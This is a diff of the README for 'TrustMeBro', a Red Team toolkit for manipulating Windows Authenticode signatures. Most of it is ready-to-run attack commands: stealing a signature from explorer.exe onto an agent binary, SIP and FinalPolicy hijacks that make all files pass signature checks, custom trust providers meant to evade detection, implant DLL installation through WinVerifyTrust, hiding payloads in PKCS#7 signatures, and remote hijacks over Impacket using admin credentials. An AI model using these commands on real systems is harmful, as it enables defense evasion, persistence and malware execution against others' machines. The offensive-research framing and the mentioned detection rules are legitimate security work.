@@ -4,7 +4,7 @@ Authenticode signature manipulation toolkit for Red Team operations and security
 
 Available in Python (cross-platform) and C++ (Windows native).
 
-> **SIP and Trust Provider changes are cached per-process.** After running `hijack`, `sip-exec install`, or `clean`, you must start a **new process** to see the effect. Some operations (FinalPolicy, SIP hijack) survive reboot. Others (custom provider) require the calling application to use the registered GUID. If `signtool verify` still shows the old result, close it and open a new instance.
+> **Registry changes are cached per-process.** After running `hijack`, `sip-exec install`, or `clean`, you must **log out and log back in** or start a new process to see the effect. If `signtool verify` or `Get-AuthenticodeSignature` still shows the old result, close the process and open a fresh one. FinalPolicy and SIP hijack changes survive reboot.
 
 ## Repository Structure
 
@@ -20,10 +20,6 @@ TrustMeBro/
 │   └── stub.c                          Self-extracting stub (reads its own PE)
 ├── tools/
 │   └── FormatGhost/                    CryptDllFormatObject persistence tool
-│       ├── format_ghost.c              DLL template
-│       ├── register.py                 Registry OID registration helper
-│       ├── Makefile
-│       └── README.md
 ├── detection/                          YARA and Sigma detection rules
 ├── experimental/
 │   ├── publisher-spoof/                Publisher name spoofing research
@@ -60,36 +56,34 @@ TrustMeBro/
 
 ## C++ Usage
 
-Every subcommand supports `--clean` to reverse its own changes, `--dry-run` to preview without writing, and `-v` for verbose output. Every write operation prints an undo hint on completion.
+Every subcommand supports `--dry-run` to preview without writing and `-v` for verbose output. Write operations print an undo hint on completion.
 
 ### steal
 
-Steal signature and metadata from a donor PE.
+Steal signature and metadata from a donor PE. File operations only, no registry changes.
 
 ```cmd
 TrustMeBro.exe steal explorer.exe agent.exe
 TrustMeBro.exe steal explorer.exe agent.exe --clone
-TrustMeBro.exe steal explorer.exe agent.exe --no-hijack
-TrustMeBro.exe steal explorer.exe agent.exe --sip-types PE,VBScript,JScript
-TrustMeBro.exe steal explorer.exe agent.exe --all-sips
-TrustMeBro.exe steal --clean
 TrustMeBro.exe steal explorer.exe agent.exe --dry-run
 ```
+
+After stealing, the signature will not validate until you run `hijack` or `--finalpolicy`.
 
 ### hijack
 
 Install SIP or FinalPolicy persistence on the local machine. Requires admin.
 
-> **Changes take effect in new processes only.** Close and reopen any verification tool (signtool, PowerShell, Explorer) after running hijack. FinalPolicy and SIP hijack survive reboot.
+> **Log out and log back in** after running hijack, or open a new process. SIP DLLs are cached in each process at first use. FinalPolicy and SIP hijack survive reboot.
 
 ```cmd
 :: SIP hijack (default: PE, PowerShell, MSI)
 TrustMeBro.exe hijack --sip-types PE,PowerShell,MSI
 
-:: SIP hijack (all 17 standard types)
+:: All 17 standard SIP types
 TrustMeBro.exe hijack --sip-types all
 
-:: SIP hijack with Smart App Control (Win11)
+:: Include Smart App Control (Win11)
 TrustMeBro.exe hijack --sip-types all --sac
 
 :: All 19 SIP GUIDs
@@ -98,13 +92,13 @@ TrustMeBro.exe hijack --all-sips
 :: FinalPolicy bypass (system-wide, all files pass signature checks)
 TrustMeBro.exe hijack --finalpolicy
 
-:: Custom trust provider GUID (evades detection rules on Authenticode GUID)
+:: Custom trust provider GUID (evades detection on Authenticode GUID)
 TrustMeBro.exe hijack --custom-provider {GUID}
 
 :: WOW64-only (hijack 32-bit callers, leave 64-bit registry clean)
 TrustMeBro.exe hijack --sip-types all --wow64-only
 
-:: Reverse any hijack
+:: Reverse any hijack with --clean
 TrustMeBro.exe hijack --clean
 TrustMeBro.exe hijack --finalpolicy --clean
 TrustMeBro.exe hijack --custom-provider {GUID} --clean
@@ -135,16 +129,15 @@ TrustMeBro.exe extract output.exe recovered.bin --camouflage
 
 ### sip-exec
 
-Install, remove, or list payload DLLs on the SIP execution surface. Installed DLLs load in any process that calls WinVerifyTrust.
+Install, remove, or list payload DLLs on the SIP execution surface.
 
-> **The payload DLL loads in the next process that calls WinVerifyTrust.** Already-running processes will not load it until restarted. To force a trigger, open a new Explorer window or run `signtool verify` on any file.
+> **The payload DLL loads in the next process that calls WinVerifyTrust.** Log out and log back in, or start a new verification process, to trigger it.
 
 Named GUID aliases: `pe`, `ps1`, `jscript`, `vbscript`, `wsf`, `cab`, `catalog`, `appx`, `appx-bundle`, `msi`, `ctl`, `esd`, `sac`
 
 ```cmd
-:: Install implant (alias resolves to GUID, prints trigger extensions + affected processes)
+:: Install implant
 TrustMeBro.exe sip-exec install --dll C:\Temp\implant.dll --guid pe
-TrustMeBro.exe sip-exec install --dll C:\Temp\implant.dll --guid jscript
 
 :: Remove implant
 TrustMeBro.exe sip-exec remove --guid pe
@@ -165,40 +158,29 @@ Query local Code Integrity enforcement state. No writes. No admin required.
 TrustMeBro.exe probe
 ```
 
-Output:
-```
-[*] Code Integrity Flags: 0x00000005
-
-  CI Enabled:              YES
-  Test-Signing:            no
-  UMCI (User-Mode CI):     YES
-  Debug Mode:              no
-  Flight Signing:          no
-  HVCI (Memory Integrity): no
-  HVCI Strict:             no
-  Smart App Control:       no
-  Audit Mode:              no
-```
+Reports: CI enabled, test-signing, UMCI, debug mode, flight signing, HVCI, HVCI strict, Smart App Control, audit mode.
 
 ### clean
 
-Remove all persistence artifacts. Requires at least one scope flag.
+Remove persistence artifacts. Requires at least one scope flag.
 
-> **Cleaned keys take effect in new processes.** Already-running processes retain the old cached values until restarted.
+> **Log out and log back in** after cleanup. Already-running processes retain cached values.
 
 ```cmd
-TrustMeBro.exe clean --sip                          :: Restore all SIP keys
-TrustMeBro.exe clean --finalpolicy                  :: Restore FinalPolicy
-TrustMeBro.exe clean --custom-provider {GUID}       :: Remove custom provider
-TrustMeBro.exe clean --all                          :: SIP + FinalPolicy
-TrustMeBro.exe clean --all --dry-run                :: Preview
+TrustMeBro.exe clean --sip
+TrustMeBro.exe clean --finalpolicy
+TrustMeBro.exe clean --custom-provider {GUID}
+TrustMeBro.exe clean --all
+TrustMeBro.exe clean --all --dry-run
 ```
 
 ---
 
 ## Python Usage
 
-The Python tool uses the same subcommand names and flag names as C++. Remote operations use Impacket for registry access.
+The Python tool operates **remotely by default** (via Impacket for registry operations). Add `--local` to run on the local Windows machine using `winreg`.
+
+File operations (steal, embed, extract) always run locally on whatever machine the script is on.
 
 Requirements: Python 3.10+, `asn1crypto` (for embed/extract), `objcopy` (for metadata cloning), `impacket` (for remote hijack).
 
@@ -206,42 +188,79 @@ Requirements: Python 3.10+, `asn1crypto` (for embed/extract), `objcopy` (for met
 pip install asn1crypto
 ```
 
+### steal
+
 ```bash
-# Signature stealing
 python3 TrustMeBro.py steal -s explorer.exe -t agent.exe
 python3 TrustMeBro.py steal -s explorer.exe -t agent.exe --clone
+python3 TrustMeBro.py steal -s explorer.exe -t agent.exe --dry-run
+```
 
-# SIP hijack (remote via Impacket)
-# NOTE: target must log out and back in, or start a new process, to see changes
+### hijack (remote)
+
+> **Target must log out and log back in** or start a new process to see the changes.
+
+```bash
+# SIP hijack (default: PE, PowerShell, MSI)
 python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass
+
+# Pick specific SIP types
 python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --sip-types PE,VBScript,JScript
+
+# All 17 standard SIPs
 python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --sip-types all
+
+# All 19 (including SAC + Win11)
 python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --all-sips
+
+# Smart App Control only (Win11)
 python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --sac
 
 # FinalPolicy hijack
 python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action finalpolicy
-python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action finalpolicy-clean
 
 # Custom trust provider
 python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action custom-provider
-python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action custom-provider-clean --provider-guid {GUID}
 
 # WOW64-only
 python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --wow64-only
 
-# PKCS#7 payload embedding
+# Reverse
+python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action clean
+python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action finalpolicy-clean
+python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --action custom-provider-clean --provider-guid {GUID}
+
+# Preview
+python3 TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass --dry-run
+```
+
+### hijack (local)
+
+Run on the local Windows machine. No IP or credentials needed.
+
+```bash
+python3 TrustMeBro.py hijack --local --action hijack
+python3 TrustMeBro.py hijack --local --action finalpolicy
+python3 TrustMeBro.py hijack --local --action clean
+python3 TrustMeBro.py hijack --local --sip-types all --sac
+```
+
+### embed / extract
+
+```bash
 python3 TrustMeBro.py embed -s signed.exe -p payload.bin -o output.exe
 python3 TrustMeBro.py embed -s signed.exe -p payload.bin -o output.exe --camouflage
 python3 TrustMeBro.py embed -s signed.exe -p payload.bin -o output.exe --signer-index 0
-
-# Payload extraction
 python3 TrustMeBro.py extract -s output.exe -o recovered.bin
 python3 TrustMeBro.py extract -s output.exe -o recovered.bin --camouflage
+```
 
-# SIP execution surface
+### sip-exec
+
+```bash
 python3 TrustMeBro.py sip-exec --dll "C:\Temp\implant.dll"
 python3 TrustMeBro.py sip-exec --dll "C:\Temp\implant.dll" --guid pe
+python3 TrustMeBro.py sip-exec --clean --guid pe
 ```
 
 ### INF-based SIP Hijack
@@ -254,8 +273,6 @@ rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\TrustMeBro\Tru
 ---
 
 ## SigStash (Payload Loader and Self-Extracting Stub)
-
-Two tools for extracting embedded payloads from a carrier PE's PKCS#7 signature.
 
 ### Loader (`SigStash/loader.cpp`)
 
@@ -272,7 +289,7 @@ SigStashLoader.exe carrier.exe --exec
 Reads its own PE from disk. Writes payload to `%TEMP%\sigstash_out.bin`. No arguments needed.
 
 ```
-1. Compile stub (or stub_camo with -DCAMOUFLAGE_MODE=1)
+1. Compile stub (or with -DCAMOUFLAGE_MODE=1)
 2. Sign with osslsigncode or signtool
 3. Embed: python3 TrustMeBro.py embed -s signed_stub.exe -p payload.bin -o final.exe
 4. Run final.exe on target
@@ -282,7 +299,7 @@ Reads its own PE from disk. Writes payload to `%TEMP%\sigstash_out.bin`. No argu
 
 ## FormatGhost (Standalone Tool)
 
-Standalone at `tools/FormatGhost/`. Registers a DLL as a `CryptDllFormatObject` handler for a custom OID. The DLL loads when `certutil -dump` or any cert UI parses a PE with that OID. Requires admin. Requires user interaction to trigger. See `tools/FormatGhost/README.md`.
+Standalone at `tools/FormatGhost/`. Registers a DLL as a `CryptDllFormatObject` handler. The DLL loads when `certutil -dump` or any cert UI parses a PE with the registered OID. Requires admin. Requires user interaction to trigger. See `tools/FormatGhost/README.md`.
 
 ---
 
@@ -291,7 +308,7 @@ Standalone at `tools/FormatGhost/`. Registers a DLL as a `CryptDllFormatObject` 
 Research prototypes. Not production-ready.
 
 - `experimental/publisher-spoof/` generates self-signed certs with chosen CN for publisher name spoofing.
-- `experimental/dual-signerinfo/` documents the kernel vs user-mode SignerInfo parser divergence (docs only, no code).
+- `experimental/dual-signerinfo/` documents kernel vs user-mode SignerInfo parser divergence (docs only).
 
 ---
 
